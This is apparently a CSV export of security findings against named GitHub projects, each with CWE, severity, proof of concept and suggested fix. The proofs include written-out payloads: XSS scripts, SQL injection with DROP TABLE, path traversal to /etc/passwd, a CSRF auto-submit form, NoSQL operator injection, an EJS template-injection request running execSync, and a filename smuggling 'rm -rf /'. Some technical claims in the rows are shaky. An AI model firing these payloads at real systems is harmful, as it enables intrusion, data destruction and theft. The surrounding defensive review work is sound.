144,1745910367099,https://github.com/revaturelabs/TrialoftheTitans/TrialoftheTitansPackage/main/default/aura/QCQuestionsImport /QCQuestionsImportController.js,CWE-79,Very Low,2025-04-29T07:06:07.000Z,2025-04-29T07:20:31.000Z,"Vulnerability Type:
CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

Proof of Concept:
The following vulnerable line in the showfiledata function directly inserts untrusted CSV content into the DOM using innerHTML:


cell.innerHTML = cells[j];
If the CSV file contains a value like <script>alert('XSS')</script>, it will be interpreted and executed by the browser when rendered in the DOM.

Severity:
LOW—The vulnerability requires user interaction (uploading a malicious CSV), but it can lead to script execution in the browser of a privileged user such as an admin.

Root Cause:
The root cause is the use of innerHTML to assign user-controlled CSV content into table cells. This method renders any embedded HTML or JavaScript as actual DOM content. There is no sanitization or escaping of special characters like < and >, which allows arbitrary HTML/JS to be executed.

Exploit Scenario:
An attacker uploads a CSV file containing:


Name,Value
<script>alert('XSS')</script>,123
When this file is processed by the application and rendered using innerHTML, the <script> tag executes, showing an alert. In a real attack, the script could steal cookies, session tokens, or perform malicious actions.

Why It Happens:
This happens because the code uses innerHTML, which interprets input as raw HTML. When this method is applied to user-generated or untrusted data, it opens the door to HTML and JavaScript injection.

Security Implications:
An attacker can exploit this flaw to execute JavaScript in the context of the victim's browser. This can lead to:

Session hijacking

Credential theft

Redirection to malicious sites

UI defacement or manipulation

Unauthorized actions on behalf of the user

If an admin uploads or previews the malicious CSV file, the attacker can potentially compromise the entire system.

Suggested Fix:
Replace innerHTML with a secure alternative such as textContent or use document.createTextNode. These methods ensure that input is treated strictly as text and not executable code.
For example:


var textNode = document.createTextNode(cells[j]);
cell.appendChild(textNode);
This change prevents HTML tags from being rendered or executed, thereby neutralizing any embedded scripts or markup."
145,1745910862464,https://github.com/zulip/zulip/blob/main/zerver/migrations/0544_copy_avatar_images.py,"CWE-22, CWE-23",High,2025-04-29T07:14:22.000Z,2025-04-29T07:43:22.000Z,"Vulnerability Type:
CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')
[line: 178,182,183,191,197]
Proof of Concept (Elaborated):
Vulnerable Code:
os.remove(new_base + "".original"")
os.link(old_base + "".original"", new_base + "".original"")
with open(old_base + "".original"", ""rb"") as f:
with open(new_base + "".png"", ""wb"") as f:

Step-by-Step Explanation:
1.	Problem:
o	old_base and new_base are constructed using user data (user.realm_id, user.id, and settings.LOCAL_AVATARS_DIR).
o	No strict validation is performed to ensure that these paths stay within the intended LOCAL_AVATARS_DIR.
o	os.remove, os.link, and open() are called directly on these paths.
2.	How to Attack:
o	An attacker can manipulate user.realm_id or related values to inject traversal sequences like:
o	../../../etc/passwd
o	If injected successfully, the server might:
	Delete critical system files (/etc/passwd)
	Overwrite or create unauthorized files
	Cause Denial of Service (DoS)

Example Exploit:
Suppose user.realm_id is set to:
../../../etc
Then old_base becomes:
/your/app/path/../../../etc/<hash>.original
Which resolves to:
/etc/<hash>.original
Result:
•	Critical system files under /etc/ could be read, modified, or deleted.

Severity:
Critical (Full Filesystem Compromise)

Root Cause:
The application blindly trusts user-derived data to construct file paths, and then performs filesystem operations without validating or restricting the final paths.

Exploit Scenario:
An attacker registers or modifies a user account with crafted realm_id or related fields containing directory traversal payloads.
Upon avatar processing, the server accidentally reads/writes/deletes files outside the safe avatar storage directory.

Why It Happens:
Because dynamic user input is directly included in the file system path construction without using a secure validation method like os.path.realpath() checking against a base directory.

Security Implications:
If exploited:
•	Attacker can read sensitive files (credentials, configs).
•	Overwrite important application files.
•	Delete critical files, causing server outages.
•	Elevate privileges or gain unauthorized access.

Suggested Fix:
--- 0544_copy_avatar_images.py	2025-04-27
+++ 0544_copy_avatar_images_fixed.py	2025-04-27
@@
- old_base = os.path.join(settings.LOCAL_AVATARS_DIR, str(user.realm_id), old_hash(user))
- new_base = os.path.join(settings.LOCAL_AVATARS_DIR, str(user.realm_id), new_hash(user))
+ old_base = os.path.realpath(os.path.join(settings.LOCAL_AVATARS_DIR, str(user.realm_id), old_hash(user)))
+ new_base = os.path.realpath(os.path.join(settings.LOCAL_AVATARS_DIR, str(user.realm_id), new_hash(user)))
+
+ if not old_base.startswith(os.path.realpath(settings.LOCAL_AVATARS_DIR)) or not new_base.startswith(os.path.realpath(settings.LOCAL_AVATARS_DIR)):
+     raise ValueError(""Invalid file path detected"")
"
146,1745912071860,/DhruvLamba/File-Storage/blob/b7cb16a5dec69217e4232559ec5d7d20eafa4fbe/2.py#L137,CWE-307: Improper Restriction of Excessive Authentication Attempts,High,2025-04-29T07:34:31.000Z,2025-04-29T08:04:06.000Z,"Vulnerable Code:

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        # Check if the provided credentials match the static credentials
        if username in static_users and static_users[username] == password:
            if username == 'admin':
                session['role'] = 'admin'
            elif username == 'user':
                session['role'] = 'user'
                session['username'] = username
                
                # Add the username to the active_users set
                active_users.add(session['username'])
            
            return redirect(f'/{username}')
        else:
            flash('Invalid credentials')
    
    return render_template('signin.html')

Root Cause Analysis:
The application lacks rate limiting or brute-force protection on the login endpoint (/).
No mechanism is in place to limit the number of login attempts from a single IP address or user.
No account lockout policy is implemented after consecutive failed login attempts.

Exploit Scenarios:
Brute Force Attack:
An attacker sends automated login attempts with a list of passwords to gain unauthorized access.
The absence of rate limiting allows for thousands of attempts without restriction.
Credential Stuffing:
An attacker uses leaked credentials from other platforms to attempt logins.
No mechanism is in place to detect or mitigate this behavior.
Denial of Service (DoS):
An attacker overwhelms the login endpoint with requests, consuming server resources and potentially denying service to legitimate users.

Why This Happens:
The login endpoint does not implement rate limiting or IP-based throttling.
Developers may have overlooked the importance of brute-force protection during development.
The application is not designed to detect or mitigate repeated failed login attempts.

Security Implications:
1. Unauthorized Access
2. Credential Stuffing
3. Denial of Service (DoS)

Suggested Fix:
Implement rate limiting on the login endpoint using Flask-Limiter or similar libraries.
Add account lockout functionality after a specified number of failed login attempts.
Log failed login attempts for monitoring and auditing purposes.

Code Example with Fix:

from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

# Initialize the limiter
limiter = Limiter(get_remote_address, app=app)

@app.route('/', methods=['GET', 'POST'])
@limiter.limit(""5 per minute"")  # Limit to 5 login attempts per minute per IP
def index():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        # Check if the provided credentials match the static credentials
        if username in static_users and static_users[username] == password:
            if username == 'admin':
                session['role'] = 'admin'
            elif username == 'user':
                session['role'] = 'user'
                session['username'] = username
                
                # Add the username to the active_users set
                active_users.add(session['username'])
            
            return redirect(f'/{username}')
        else:
            flash('Invalid credentials')
    
    return render_template('signin.html')
Additional Enhancements:
Implement account lockout after 3–5 consecutive failed attempts.
Use CAPTCHA to prevent automated login attempts.
Log the IP address and timestamp of failed login attempts for monitoring."
147,1745912332983,https://github.com/sr258/scorm-h5p-wrapper/src /index.js,CWE-352,Medium,2025-04-29T07:38:52.000Z,2025-04-29T08:29:10.000Z,"Vulnerability Type:
CWE-352: Cross-Site Request Forgery (CSRF)

Severity:
Medium

Root Cause:
The Express.js application lacks a CSRF protection middleware such as csurf, allowing unauthenticated or cross-origin POST requests to be processed by endpoints like /convert. This absence of CSRF protection means that the server cannot differentiate between legitimate requests from the application and malicious requests from other domains. As a result, any web page can silently perform file uploads or SCORM conversion actions on behalf of a logged-in user.

Exploit Scenario:
A victim logs into the H5P conversion platform and keeps the session active. Meanwhile, the victim unknowingly visits a malicious site crafted by an attacker. This attacker hosts a form on their site that targets the /convert endpoint with hidden inputs and a fake file. When the victim’s browser auto-submits the form, the application accepts and processes the request, misusing the victim’s active session to perform unintended uploads or actions.

Why It Happens:
The server accepts and executes POST requests without verifying the origin or ensuring the request was intentionally submitted by the authenticated user. There’s no CSRF token validation mechanism in place—no csrf middleware or token-based verification in forms. This leaves the system open to state-changing actions initiated from malicious third-party sites.

Security Implications:
An attacker can forge requests to endpoints that accept file uploads or modify server state. If successful, this can lead to:

Unauthorized file uploads or conversions.

Consumption of system resources without user consent.

Abuse of the platform for hosting or processing malicious content.

Potential execution of backdoor attacks through uploaded files. All of this can be done without the victim’s knowledge, making it a severe breach of trust and user data integrity.

Proof of Concept (PoC):


<!-- Attacker-controlled page -->
<html>
  <body onload=""document.forms[0].submit()"">
    <form action=""http://victim-app.com/convert"" method=""POST"" enctype=""multipart/form-data"">
      <input type=""hidden"" name=""h5p_mastery_score"" value=""100"" />
      <input type=""file"" name=""h5p_file"" />
    </form>
  </body>
</html>
When visited by an authenticated user, this HTML silently submits a file and score to the vulnerable endpoint using the user’s active session cookies.

Suggested Fix:
Implement CSRF protection using a library such as csurf. This middleware generates and validates CSRF tokens for every form submission or AJAX request. Steps include:

Install the required libraries:


npm install csurf cookie-parser
Configure the middleware:


const cookieParser = require('cookie-parser');
const csrf = require('csurf');

app.use(cookieParser());
app.use(csrf({ cookie: true }));
In forms, include the CSRF token:

<input type=""hidden"" name=""_csrf"" value=""{{ csrfToken }}"" />
This change ensures that only requests with valid CSRF tokens, issued by the server, are processed—effectively blocking cross-origin attacks.

"
148,1745912783724,https://github.com/harshit-wadhwani/Online-food-ordering-system/blob/main/userdata.py,"CWE-89, CWE-256",High,2025-04-29T07:46:23.000Z,2025-04-29T08:18:35.000Z,"The code contains two high severity vulnerabilities inlcuding CWE-89-SQL_Injection and CWE-256-Unprotected_Storage_of_Credentials

==================================================

CWE-89:
Explanation:
All SQL queries in the code are constructed by directly interpolating user-supplied data into SQL statements using Python f-strings. This allows attackers to inject arbitrary SQL code, which can lead to unauthorized data access, data modification, or even deletion of the entire database.


POC:

# Malicious email input to extract all user passwords
login(""anything' OR '1'='1"", ""irrelevant"")
# Or, during signup, inject SQL to add an admin user or drop tables
signup(""test@example.com', 'hacker', 'x', '123', 'pass'); DROP TABLE users; --"", ""hacker"", ""x"", ""123"", ""pass"")


Root Cause: File userdata.py
Line 9, 15, 27, 33, 43, 50, 56, 61, 66, 71, 76: All SQL queries use f-strings with unescaped user input, e.g.:

mc.execute(f""SELECT password FROM users WHERE email = '{email}'"")  # line 15
mc.execute(f""INSERT INTO users ... VALUES (..., '{email}', ... )"")  # line 27
mc.execute(f""UPDATE users SET ... WHERE user_id ={user_id} "")  # line 61


Exploit Scenario:
An attacker crafts input such as email = ""foo' OR '1'='1"" to the login or get_details function, causing the query to return all users’ data or bypass authentication.
In the signup function, an attacker can inject SQL to drop tables or create new admin users.


Why it Happens:
The code directly inserts user-controlled input into SQL queries without using parameterized statements or escaping, making it vulnerable to SQL injection attacks.


Security Implications:
Attackers can bypass authentication, extract sensitive data, modify or delete records, and potentially destroy the entire database.


Suggested Fix:
Use parameterized queries (prepared statements) provided by the mysql.connector library.

Patch Fix for login function:

python
def login(email, password):
    mc.execute(""SELECT password FROM users WHERE email = %s"", (email,))
    detail = mc.fetchall()
    try:
        passw = detail[0][0]
        if passw == password:
            return True
        else:
            return False
    except:
        return False

Apply this fix to all SQL queries, replacing f-string interpolation with parameterized placeholders (%s) and passing user input as a tuple argument.

=================================================================

CWE-256:

Explanation:
Passwords are stored and compared in plaintext, both in the database and in the application logic. This exposes user credentials to anyone with database access and increases the risk of credential theft.


POC:
Anyone with database access can run SELECT password FROM users and retrieve all user passwords in plaintext.


Root Cause: File userdata.py
Line 27, 61, 66: Passwords are stored and updated directly as plaintext:

mc.execute(f""INSERT INTO users ... '{sign_password}' ..."")  # line 27
mc.execute(f""UPDATE users SET password ='{password}' ..."")  # line 66


Exploit Scenario:
If the database is compromised, all user passwords are immediately exposed.


Why it Happens:
The code does not hash or salt passwords before storing or comparing them.


Security Implications:
User accounts can be compromised through SQL injection above, and users who reuse passwords elsewhere are at risk.


Suggested Fix:
Use a secure password hashing algorithm such as bcrypt.

Patch Fix for signup and login:

import bcrypt

def signup(email, name, address, phnumber, sign_password):
    hashed = bcrypt.hashpw(sign_password.encode(), bcrypt.gensalt())
    mc.execute(""INSERT INTO users (user_id, email, name, password, address, phonenumber) VALUES (DEFAULT, %s, %s, %s, %s, %s)"",
               (email, name, hashed.decode(), address, phnumber))
    db.commit()
    return True

def login(email, password):
    mc.execute(""SELECT password FROM users WHERE email = %s"", (email,))
    detail = mc.fetchall()
    try:
        hashed = detail[0][0].encode()
        if bcrypt.checkpw(password.encode(), hashed):
            return True
        else:
            return False
    except:
        return False"
149,1745913093991,farhan0715/Chatbot-Using-Gemini/blob/b738c4ea24ab0f1538ec0fa6d2e37b39d85ca237/multipdf.py#L115,CWE-434: Unrestricted Upload of File with Dangerous Type,Critical,2025-04-29T08:40:44.000Z,2025-04-29T08:51:53.000Z,"Vulnerable Code:
def get_pdf_text(pdf_docs):
    text = """"
    for pdf in pdf_docs:
        pdf_reader = PdfReader(pdf)  # No validation
        for page in pdf_reader.pages:
            text += page.extract_text()

Root Cause Analysis:

The get_pdf_text() function processes PDFs without:
1.File type verification
2.Size limitations
3.Content sanitization
PyPDF2 doesn't disable dangerous features by default.

Exploit Scenarios:
Arbitrary code execution via embedded JavaScript
Denial of Service through decompression bombs
Path traversal if filenames contain ../

Security Implications:
1.Remote Code Execution
2. Denial of Service
3. Data Exfiltration

Suggested Fix:

from fpdf import FPDF
import tempfile

def safe_extract_text(pdf_file):
    MAX_SIZE = 10 * 1024 * 1024  # 10MB
    if len(pdf_file.read()) > MAX_SIZE:
        raise ValueError(""File too large"")
    pdf_file.seek(0)
    
    if not pdf_file.read(4) == b'%PDF':
        raise ValueError(""Invalid PDF"")
    pdf_file.seek(0)
    
    with tempfile.NamedTemporaryFile() as tmp:
        tmp.write(pdf_file.read())
        reader = PdfReader(tmp.name)
        return """".join(page.extract_text() for page in reader.pages)"
150,1745913290312,https://github.com/mde/ejs/tree/v3.1.9,CWE-1336,Critical,2025-04-29T07:54:50.000Z,2025-04-29T16:14:36.000Z,"Summary
EJS v3.1.9 and earlier releases suffer from a critical Server-Side Template Injection (SSTI) flaw (CVE-2023-29827) because untrusted template configuration options are directly inlined into generated JavaScript and executed via new Function(...) 
GitHub
NVD
. Attackers who can control view options—most notably the closeDelimiter parameter or a custom escapeFunction—can break out of the intended string context and execute arbitrary code on the server with full privileges 
GitHub
sechead.com
. This issue remains unpatched in the latest official release (v3.1.10) and demands an immediate workaround or upstream fix 
cve.circl.lu
.

Vulnerability Details
Root Cause
Unsafe Inlining of User Options
In lib/ejs.js, the compilation step concatenates opts.escapeFunction.toString() or other user-supplied parameters into the template source without sanitization:

js
Copy
Edit
if (opts.client) {
  src = 'escapeFn = escapeFn || ' + escapeFn.toString() + ';' + '\n' + src;
}
This injects raw JavaScript from the attacker into the code passed to new Function(...), enabling SSTI and eventual RCE 
Vulners
.

Bypassing Previous Fixes
Although CVE-2022-29078 addressed outputFunctionName injection in v3.1.7, the closeDelimiter attack path remains and is fully exploitable in v3.1.9 
sechead.com
GitHub
.

Affected File Locations
lib/ejs.js (around line 610): Contains the vulnerable inlining logic for opts.client and opts.escapeFunction 
Vulners
.

lib/ejs.js (around line 150): Parser logic that reads opts.closeDelimiter directly into the regex without validation, allowing delimiter injection 
GitHub
.

Express Integration: When using Express’s built-in view engine support, view options from the request merge into EJS’s opts, exposing the vulnerability to HTTP parameters 
GitHub
.

Exploitation Scenarios
Delimiter Injection via Express view options

http
Copy
Edit
GET /page?
  settings[view%20options][closeDelimiter]=1"");require('child_process').execSync('uname -a');// 
This sets closeDelimiter to a malicious string that closes the original JavaScript literal and executes uname -a, returning system information 
GitHub
.

Custom Escape Function SSTI

js
Copy
Edit
ejs.render(template, data, {
  client: true,
  escapeFunction: () => { process.exit(1) }
});
Because EJS calls escapeFunction.toString(), the attacker’s function body is embedded and runs immediately during compilation 
Vulners
.

Phishing & Credential Theft
By injecting script that renders a fake login form, an attacker can harvest user credentials within the same origin context, bypassing CORS restrictions and CSRF protections 
cve.circl.lu
.

Persistent Backdoor
Malicious code can write to files or modify templates in memory, establishing a long-lived backdoor for data exfiltration or lateral movement 
Broadcom Inc. | Connecting Everything
.

Impact
Remote Code Execution (RCE): Complete server takeover, including file system access, database queries, and spawning of additional processes 
NVD
.

Data Breach: Exposure of environment variables, credentials, and sensitive business data to attackers 
cve.circl.lu
.

Compliance Violations: SSTI breaches PCI-DSS, GDPR, and other regulatory frameworks, leading to fines and reputational damage 
Broadcom Inc. | Connecting Everything
.

High Severity: CVSS v3.1 score 9.8 (Critical) with CWE-74: Improper Neutralization of Special Elements 
NVD
Vulners
.

Mitigation
Immediate Workaround: Disable client compilation (client: true) and avoid passing any untrusted functions via escapeFunction.

Patch-Package: Apply a local patch to remove the opts.client branch in lib/ejs.js or sanitize opts.closeDelimiter against a strict regex.

Upstream Fix: Advocate for an official release that rejects non-alphanumeric delimiters and disallows inlining of arbitrary function source.

Runtime Hardening: Run EJS in a sandboxed VM context or under a restricted OS user to limit blast radius even if RCE occurs.

References

GitHub Advisory GHSA-j5pp-6f4w-r5r6: CVE-2023-29827 
GitHub

GitHub Issue #720 (PoC & discussion) 
GitHub

NVD CVE-2023-29827 (Critical, 9.8) 
NVD

Circl.lu CVE database 
cve.circl.lu

Broadcom Attack Signatures 
Broadcom Inc. | Connecting Everything

Vulners Nuclei Template CVE-2023-29827 
Vulners

Sechead Writeup on CVE-2022-29078 Bypass 
sechead.com"
151,1745914102634,https://github.com/VitorMours/Record-Management-System/blob/master/src/database.py,CWE-89,High,2025-04-29T08:08:22.000Z,2025-04-29T08:13:31.000Z,"Explanation: 
SQL Injection in update_value(): Unsanitized user input in new_name and new_surname parameters allows arbitrary SQL execution.
SQL Injection in delete_value(): Unsanitized user_id allows SQL injection.
Dynamic Table Name Injection (Multiple Functions): TABLE_NAME is set via create() and used unsafely in fetch_data(), fetch_last_id(), and restart_database().


POC:
POC1: update_value(1, ""malicious', sobrenome='hacked""); DROP TABLE informacao_clientes;--"", ""dummy"")
POC2: delete_value(""1; DROP TABLE informacao_clientes--"", ""dummy"")
POC3: create(""malicious; DROP TABLE informacao_clientes--"")


Root Cause: File --> src/database.py
Line 42: cursor.execute(f""UPDATE {TABLE_NAME} set nome='{new_name}', sobrenome='{new_surname}' WHERE id={user_id}"")
Line 53: cursor.execute(f""DELETE FROM {TABLE_NAME} WHERE id={user_id}"")
Line 15: cursor.execute(f""UPDATE sqlite_sequence SET seq=1 WHERE {TABLE_NAME}"")
Line 24: cursor.execute(f""CREATE TABLE IF NOT EXISTS {NEW_TABLE_NAME}...""


Exploit Scenario: 
Attackers modify the nome/sobrenome parameters to execute destructive SQL (e.g., DROP TABLE).
Attacker deletes tables or exfiltrates data.
Attacker creates tables with malicious names to disrupt queries.


Why It Happens: 
String concatenation without parameterization.
Direct interpolation of numeric input.
Lack of table name validation.


Security Implications: 
Full database compromise (data deletion/leakage).
Unauthorized data deletion.
Query disruption or data corruption.


Suggested Fix:

Patch1: 
cursor.execute(f""UPDATE {TABLE_NAME} SET nome=?, sobrenome=? WHERE id=?"", (new_name, new_surname, user_id))
Patch2:
cursor.execute(f""DELETE FROM {TABLE_NAME} WHERE id=?"", (user_id,))
Patch3:
# Add allowlist validation
if not NEW_TABLE_NAME.isidentifier():
    raise ValueError(""Invalid table name"")
"
152,1745914293473,https://github.com/shehabkotb/Edu-Hub/Server/controller/notificationController /notificationController.js,CWE-943,Medium,2025-04-29T08:11:33.000Z,2025-04-29T08:26:04.000Z,"Vulnerability Type:
CWE-943: Improper Neutralization of Special Elements in Data Query Logic

Severity:
Medium

Root Cause:
The application directly uses untrusted user-supplied data (req.body, req.params, req.query) in MongoDB/Mongoose database operations without performing any validation or sanitization. This unsafe practice enables attackers to inject malicious query operators (like $gt, $ne, $where), modifying the database queries' behavior and potentially compromising database security.

Exploit Scenario:
An attacker sends a crafted payload like { ""$gt"": """" } instead of a regular ID in a POST request targeting endpoints such as /editNotification or /deleteNotification. Because Mongoose does not sanitize inputs by default, the attack can manipulate queries to match unintended documents, allowing unauthorized data retrieval, modification, or deletion across different users' notifications.

Example Attack Payload:


{
  ""oldNot"": { ""to"": { ""$gt"": """" } },
  ""newNot"": { ""message"": ""hacked!"" }
}
This could update all notification documents where to is greater than an empty string, effectively mass-modifying data across the database.

Why It Happens:
The server trusts incoming request fields (req.body, req.params, req.query) and directly embeds them into MongoDB queries without checking their structure or content. In NoSQL databases like MongoDB, objects and operators (like $gt, $ne) can be injected easily if inputs are not sanitized.

Security Implications:
Unauthorized access or modification of other users' notifications.

Mass deletion of critical records.

Data leakage or unauthorized disclosure.

Potential backend server compromise if malicious aggregation pipelines are injected.

Ultimately, NoSQL Injection can severely compromise confidentiality, integrity, and availability of data within the application.

Proof of Concept (PoC):
Example request targeting /editNotification:


curl -X POST http://example.com/notification/edit \
  -H ""Content-Type: application/json"" \
  -d '{
        ""oldNot"": { ""to"": { ""$gt"": """" } },
        ""newNot"": { ""message"": ""hacked"" }
      }'
Effect: All notifications where to > """" are modified.

Suggested Fix:
Sanitize all inputs using libraries like express-validator or validator.js.

Strictly validate schemas using Mongoose validation and reject unknown fields.

Whitelist expected fields rather than blacklisting dangerous ones.

Example secure approach:


const { check, validationResult } = require('express-validator');

app.post('/notification/edit',
  [
    check('oldNot.to').isMongoId(),
    check('newNot.message').isString()
  ],
  async (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({ errors: errors.array() });
    }
    // safe usage after validation
  });
Use mongoose-sanitize middleware to automatically remove special characters that can trigger injection."
153,1745914709106,https://github.com/lugaye/lms/server.js,CWE-522,Very Low,2025-04-29T08:18:29.000Z,2025-04-29T08:21:43.000Z,"Vulnerability Type:
CWE-522: Insufficiently Protected Credentials
(Insufficient Secure Cookie Settings in Session Management)

Severity:
Very Low

Root Cause:
The Express application uses express-session without configuring the cookie.secure attribute. By default, cookies are transmitted over both HTTP and HTTPS. Without setting secure: true, session cookies can be intercepted in plaintext over insecure (HTTP) connections, exposing sensitive session IDs to attackers.

Exploit Scenario:
An attacker connected to the same network as the victim (e.g., public Wi-Fi) intercepts the session cookie transmitted over HTTP (unencrypted). Using the stolen cookie, the attacker can hijack the user’s session, gaining unauthorized access to their authenticated session in the application.

For example:

Victim logs into the application over http://example.com.

Attacker sniffs the network traffic and retrieves the connect.sid session cookie.

Attacker reuses the session cookie to impersonate the victim.

Why It Happens:
The secure option in express-session ensures that cookies are only sent over HTTPS.
Since it is missing or not set to true, the browser sends session cookies even over unencrypted HTTP requests, making them vulnerable to Man-in-the-Middle (MitM) attacks.

Security Implications:
Session Hijacking: Unauthorized users can gain control of valid user sessions.

Data Breach: Exposing sensitive user information or personal data.

Authentication Bypass: Attackers can bypass authentication mechanisms entirely by replaying session tokens.

Reduced Trust: Users may face account takeover risks, damaging the platform’s reputation.

Proof of Concept (PoC):
Observed Insecure Configuration:


app.use(session({
    secret: 'secret-key',
    resave: false,
    saveUninitialized: true
}));
The secure flag for the session cookie is NOT enabled.

Result:

Session cookie (connect.sid) is transmitted in plaintext if accessed over HTTP.

Can be easily captured using tools like Wireshark or Burp Suite on an unsecured network.

Suggested Fix:
Explicitly set cookie.secure: true in production environments when HTTPS is enabled.

Safe configuration example:


app.use(session({
    secret: 'secret-key',
    resave: false,
    saveUninitialized: true,
    cookie: { secure: process.env.NODE_ENV === 'production' }
}));
Important:

Ensure your server uses HTTPS before enabling secure: true, otherwise cookies won't be set at all.

Use environment variables to dynamically control the secure flag based on deployment."
154,1745915094746,https://github.com/Tristan296/FileManager/blob/main/FileManager.py,"CWE-22, CWE-78",Critical,2025-04-29T08:24:54.000Z,2025-04-29T08:31:59.000Z,"The code contains one critical (CWE-78-OS_Command_Injection) and one high severity (CWE-22-Path_Traversal) issue 
============================================================
CWE-22: 
Explanation: 
The code constructs paths using unsanitized user input, allowing attackers to access arbitrary files.

POC:

# As attacker, provide ""../"" sequences in parent_folder/folder_name inputs
Parent: ""../../../../..""
Folder: ""etc""
# Moves file to ~/../../../../../etc (system directory)


Root Cause: File FileManager.py
moveFile(): parent_folder/folder_name inputs (Line 15-16)
openFile(): found_file input (Line 34)
searchComputer(): filename/filetype inputs (Line 51-52)


Exploit Scenario: 
Attacker reads /etc/passwd or overwrites system files.


Why it Happens: 
Lack of input validation and path sanitization.


Security Implications: 
Data theft, system compromise through arbitrary file read.


Suggested Fix:

from pathlib import Path

def sanitize_path(user_input):
    path = Path(user_input).name  # Remove path traversal sequences
    return str(Path.home() / ""secure_folder"" / path)  # Restrict to safe base dir

=====================================================================================

CWE-78:
Explanation: 
subprocess.run(['open', found_file]) executes shell commands with untrusted input.


POC:
Create malicious filename: ""file; rm -rf /""
Triggers command injection when the file is opened


Root Cause: File FileManager.py
Line 44 (subprocess.run(['open', found_file]))


Exploit Scenario: 
Attacker deletes files or spawns reverse shells.


Why it Happens: 
Direct use of user-controlled input in shell commands.


Security Implications: 
Arbitrary Command Execution leading to full system compromise.


Suggested Fix:
Patch:
# Use secure file open instead
os.startfile(found_file)  # Windows/macOS safe alternative
# OR validate filename with strict regex first"
155,1745916085514,https://github.com/joaorafaelm/text-classification-python /amazon_scrape.py,CWE-319,Very Low,2025-04-29T08:41:25.000Z,2025-04-29T09:18:50.000Z,"Vulnerability Type:
CWE-319: Cleartext Transmission of Sensitive Information

Severity:
Very Low

Root Cause:
The script makes HTTP requests to http://www.amazon.com/dp/{asin}, which uses unencrypted cleartext transmission. This leaves the data (including product requests and responses) vulnerable to interception, modification, or eavesdropping by attackers during transmission over untrusted networks.

Exploit Scenario:
A malicious actor on a public Wi-Fi network uses a packet-sniffing tool (e.g., Wireshark) to monitor traffic from the scraper. Since the scraper sends requests to http://amazon.com, the attacker can:

Intercept and read the response data in plain text.

See which products are being scraped.

Potentially manipulate responses via MitM attacks.

Why It Happens:
The developer used http:// in the base URL:


URL = 'http://www.amazon.com/dp/'
This instructs requests.get(...) to initiate unsecured connections. Without TLS encryption (which https:// provides), the transmitted data is exposed to the network layer.

Security Implications:
Sensitive data exposure — While ASINs may not be confidential, interception may reveal scraping behavior or be part of a broader attack vector.

Data integrity risks — Man-in-the-middle attackers can modify responses.

Blocking and legal risks — Amazon may detect scraping more easily over HTTP, as HTTPS provides encrypted headers and payloads.

Proof of Concept:

# Vulnerable line
URL = 'http://www.amazon.com/dp/'
...
page = requests.get(subdomain + PROXY + URL + identifier)
Traffic generated here is unencrypted and can be sniffed.

Suggested Fix:
Use HTTPS for all requests to ensure encryption in transit:

- URL = 'http://www.amazon.com/dp/'
+ URL = 'https://www.amazon.com/dp/'"
156,1745916554244,https://github.com/SSG-DRD-IOT/intel_retail_workshop/lab-cloud-analytics /sock_connect.js,CWE-79,Low,2025-04-29T08:49:14.000Z,2025-04-29T09:12:34.000Z,"Vulnerability Type:
CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

Severity:
Low

Root Cause:
The application uses innerHTML to insert user-controlled data (i.e., data.id, data.value, and data.timestamp) directly into the DOM. This practice opens the door for XSS attacks, as malicious input can inject script content that will be interpreted and executed by the browser.

Exploit Scenario:
An attacker gains access to a gateway and injects a payload such as:


{
  ""id"": ""<img src=x onerror=alert(1)>"",
  ""value"": ""malicious"",
  ""timestamp"": ""now""
}
This payload is passed to the updateTable() function, and the malicious script is rendered and executed in the browser due to unsafe use of innerHTML.

Why It Happens:
The code does not validate or sanitize inputs before assigning them to innerHTML:


cell1.innerHTML = data.id;
cell2.innerHTML = data.value;
cell3.innerHTML = data.timestamp;
This allows any HTML or JavaScript to be injected and interpreted by the browser.

Security Implications:
XSS can allow attackers to:

Steal session cookies

Hijack user sessions

Modify UI elements to trick users (phishing)

Load external malware

This is particularly dangerous in real-time dashboards where multiple users monitor live data feeds.

Suggested Fix:
Replace all uses of innerHTML with textContent to treat data as plain text rather than HTML:

- cell1.innerHTML = data.id;
- cell2.innerHTML = data.value;
- cell3.innerHTML = data.timestamp;
+ cell1.textContent = data.id;
+ cell2.textContent = data.value;
+ cell3.textContent = data.timestamp;
This prevents any embedded HTML or script tags from being interpreted.

Proof of Concept (PoC):
Inject the following message through the real-time data socket:


{
  ""id"": ""<img src=x onerror=alert('XSS')>"",
  ""value"": ""100"",
  ""timestamp"": ""2024-01-01T00:00:00Z""
}
It will trigger a popup alert if innerHTML is used."
157,1745917199562,https://github.com/Apparky/Hotel-Management-System-using-Python-APPARKY,CWE-89,High,2025-04-29T08:59:59.000Z,2025-04-29T09:47:45.000Z,"Explanation:
The code frequently uses Python f-strings or string concatenation to build SQL queries by directly embedding user-controlled input variables. This practice exposes the application to SQL Injection attacks, where an attacker can manipulate the input to execute arbitrary SQL commands.


POC:
If an attacker inputs a malicious string such as ""' OR '1'='1"" in any field used directly in SQL queries, they could retrieve unauthorized data or corrupt the database.

self.Customer_Contact_No_var.set(""12345 OR 1=1 --"")
my_cursor.execute(f""SELECT Customer_ID, * FROM customer WHERE Contact_No = {self.Customer_Contact_No_var.get()}"")

This would translate to:

SELECT Customer_ID, * FROM customer WHERE Contact_No = 12345 OR 1=1 -- 
which returns all rows.


Root Cause: File rooms_booking.py

Line ~161 (fetch_contact function):
my_cursor.execute(f""SELECT Customer_ID, * FROM customer WHERE Contact_No = {self.Customer_Contact_No_var.get()}"")

Line ~292 (delete_data function):
my_cursor.execute(f""DELETE FROM room_booking WHERE Booking_ID = {self.Customer_Booking_ID_var.get()}"")

Line ~415 (search function):
my_cursor.execute(f""SELECT * FROM room_booking WHERE {self.search_by_table_var.get()} = '{self.search_by_attribute_var.get()}'"")

Line ~485 (booked_room_no function):
my_cursor.execute(f""""""UPDATE room_types SET Availability = 'No' WHERE Room_No = {self.Allotted_room_var.get()}"""""")


Exploit Scenario:
